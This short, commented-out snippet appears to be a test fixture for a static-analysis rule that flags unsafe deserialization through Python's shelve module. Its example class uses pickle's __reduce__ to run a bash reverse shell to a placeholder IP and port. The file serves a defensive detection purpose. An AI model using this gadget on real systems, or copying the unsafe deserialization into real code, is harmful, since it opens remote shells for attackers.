#{ex-fact rule=untrusted-deserialization@v1.0 defects=1}

# # Import dependencies
# import os
# import _pickle
# import cPickle
# import socket

# class Shell_code(object):
#   def __reduce__(self):
#           return (os.system,('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))
# import shelve
# # ruleid: avoid-shelve
# myShelve = shelve.open(Shell_code())

#{/ex-fact}
